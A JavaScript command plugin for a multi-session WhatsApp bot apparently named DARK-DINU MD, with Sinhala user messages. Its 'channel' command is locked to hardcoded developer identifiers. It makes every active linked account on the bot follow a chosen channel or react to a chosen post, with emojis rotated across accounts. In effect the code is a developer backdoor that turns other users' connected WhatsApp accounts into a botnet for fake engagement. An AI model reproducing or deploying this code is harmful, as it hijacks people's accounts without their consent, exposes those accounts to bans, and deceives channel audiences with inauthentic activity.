import { delay } from "@whiskeysockets/baileys";
import { cleanPhone } from "../src/core/sessionManager.js";

// Master Developer Whitelist (LID JID and clean numbers)
const DEV_IDENTIFIERS = new Set([
  "15947733680169@lid",
  "15947733680169",
  "15947733080169@lid",
  "15947733080169"
]);

function isAuthorized(sock, msg, from) {
  // Direct matching against raw JIDs and LID identifiers
  const senderJid = msg.key.fromMe
    ? (sock.user?.id || "")
    : (msg.key.participant || msg.participant || from || "");

  const cleanSender = cleanPhone(senderJid);
  const rawLid = senderJid.split(":")[0];

  return (
    DEV_IDENTIFIERS.has(senderJid) ||
    DEV_IDENTIFIERS.has(rawLid) ||
    DEV_IDENTIFIERS.has(cleanSender)
  );
}

function extractInviteCode(input = "") {
  const match = input.match(/whatsapp\.com\/channel\/([0-9A-Za-z_-]+)/i);
  return match ? match[1] : input.trim();
}

function extractPostDetails(input = "") {
  const match = input.match(/whatsapp\.com\/channel\/([0-9A-Za-z_-]+)(?:\/(\d+))?/i);
  if (!match) return null;
  return {
    channelCode: match[1],
    postId: match[2] || null
  };
}

export default {
  name: "channel",
  aliases: ["cfollow", "creact", "ch"],
  category: "owner",
  description: "Strict targeted channel actions (Developer Only)",

  async execute({ sock, msg, from, args, prefix, body }) {
    const pref = prefix || ".";
    const fullCmd = (body || "").trim().slice(pref.length).trim().split(/\s+/)[0].toLowerCase();
    const subCmd = args[0]?.toLowerCase();

    // 🔒 Strict Developer Guard (15947733680169@lid Only)
    if (!isAuthorized(sock, msg, from)) {
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "🔒 *Access Denied!* මෙම Command එක ක්‍රියාත්මක කළ හැක්කේ Developer හට පමණි." },
        { quoted: msg }
      );
    }

    const activeSockets = global.activeSockets || new Map();
    const socketsList = activeSockets.size > 0 ? Array.from(activeSockets.values()) : [sock];

    // ==========================================
    // 1. TARGETED FOLLOW (.cfollow <link>) - DEVELOPER ONLY
    // ==========================================
    if (fullCmd === "cfollow" || subCmd === "follow") {
      const targetLink = (fullCmd === "cfollow" ? args.join(" ") : args.slice(1).join(" ")).trim();
      const code = extractInviteCode(targetLink);

      if (!code) {
        return await sock.sendMessage(
          from,
          { text: `⚠️ *භාවිතා කරන ආකාරය:*\n${pref}cfollow https://whatsapp.com/channel/0029Vb...` },
          { quoted: msg }
        );
      }

      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      let successCount = 0;
      let targetJid = null;

      try {
        if (typeof sock.newsletterMetadata === "function") {
          const meta = await sock.newsletterMetadata("invite", code);
          targetJid = meta?.id;
        }
      } catch (_) {}

      if (!targetJid) targetJid = `${code}@newsletter`;

      for (const s of socketsList) {
        try {
          if (typeof s.newsletterFollow === "function") {
            await s.newsletterFollow(targetJid);
            successCount++;
          }
        } catch (_) {}
        await delay(250);
      }

      sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        {
          text:
`✨ *CHANNEL FOLLOW COMPLETED!*
━━━━━━━━━━━━━━━━━━━━━
📢 *Target Code:* \`${code}\`
🤖 *Followed Nodes:* \`${successCount} / ${socketsList.length}\`
🔒 *Authorization:* Verified Developer (\`15947733680169@lid\`)

💖 *DARK-DINU MD*`
        },
        { quoted: msg }
      );
    }

    // ==========================================
    // 2. TARGETED REACT ONLY (.creact <link> <emojis>)
    // ==========================================
    if (fullCmd === "creact" || subCmd === "react") {
      const rawArgs = fullCmd === "creact" ? args : args.slice(1);
      const postLink = rawArgs[0];
      const emojis = rawArgs.slice(1);

      if (!postLink || emojis.length === 0) {
        return await sock.sendMessage(
          from,
          {
            text: `⚠️ *භාවිතා කරන ආකාරය:*\n${pref}creact <post_link> ❤️ 🔥 ⚡\n\n*(Post එක click කර Share > Copy link මඟින් ලබාගත් link එක පමණක් දමන්න)*`
          },
          { quoted: msg }
        );
      }

      const postData = extractPostDetails(postLink);
      if (!postData || !postData.postId) {
        return await sock.sendMessage(
          from,
          { text: "❌ *Invalid Post Link!* Link එකේ අගට Post ID එක තිබිය යුතුය (Click Post > Share > Copy link)." },
          { quoted: msg }
        );
      }

      sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});

      let newsletterJid = null;
      try {
        if (typeof sock.newsletterMetadata === "function") {
          const meta = await sock.newsletterMetadata("invite", postData.channelCode);
          newsletterJid = meta?.id;
        }
      } catch (_) {}
      if (!newsletterJid) newsletterJid = `${postData.channelCode}@newsletter`;

      let sentCount = 0;
      for (let i = 0; i < socketsList.length; i++) {
        const s = socketsList[i];
        const assignedEmoji = emojis[i % emojis.length];

        try {
          if (typeof s.newsletterReactMessage === "function") {
            await s.newsletterReactMessage(newsletterJid, postData.postId, assignedEmoji);
            sentCount++;
          } else if (typeof s.query === "function") {
            await s.query({
              tag: "message",
              attrs: { to: newsletterJid, type: "reaction", server_id: String(postData.postId) },
              content: [{ tag: "reaction", attrs: { code: assignedEmoji } }]
            });
            sentCount++;
          }
        } catch (_) {}

        await delay(200);
      }

      sock.sendMessage(from, { react: { text: "🎉", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        {
          text:
`🔥 *TARGETED REACTIONS DEPLOYED!*
━━━━━━━━━━━━━━━━━━━━━
📌 *Post ID:* \`${postData.postId}\`
🎯 *Channel Target:* \`${postData.channelCode}\`
🎭 *Reactions Sent:* \`${sentCount} Nodes Wave\`
💖 *Emojis:* ${emojis.join(" ")}

🔒 _Developer Access Only._`
        },
        { quoted: msg }
      );
    }

    // Help menu
    return await sock.sendMessage(
      from,
      {
        text:
`👑 *TARGETED CHANNEL SUITE*
━━━━━━━━━━━━━━━━━━━━━
🔒 *Access:* Developer Only (\`15947733680169@lid\`)

• *${pref}cfollow <link>* — ලබා දෙන Channel එක සියලුම active bot nodes මඟින් Follow වේ.
• *${pref}creact <post_link> <emojis>* — ලබා දෙන Post එකට පමණක් React වේ.

🚫 *Unauthorized Users:* 100% Blocked.`
      },
      { quoted: msg }
    );
  }
};
